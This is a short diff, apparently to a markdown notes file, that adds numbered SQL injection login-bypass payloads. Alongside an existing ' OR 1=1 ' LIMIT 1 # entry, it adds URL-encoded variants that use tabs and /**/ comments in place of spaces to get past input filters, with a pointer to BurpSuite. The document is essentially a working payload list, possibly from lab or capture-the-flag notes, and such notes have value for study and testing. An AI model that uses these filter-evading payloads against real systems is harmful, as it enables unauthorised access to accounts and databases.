@@ -10,11 +10,9 @@
 
 4- >> "  OR 1=1 ' LIMIT 1 #
 
-5- >> 
+5- >> %27%09OR%091%3D1%23 | (ENCODING to bypass the space filter by replacing it with tabs) | use BurpSuite >> `'   OR  1=1#`
 
-
-
-
+6- >> %27%20%2F%2A%2A%2For%2F%2A%2A%2F1%3D1%23 | (ENCODING to bypass spaces and tabs filter) >> `' /**/or/**/1=1#`
 
 &nbsp;
 &nbsp;
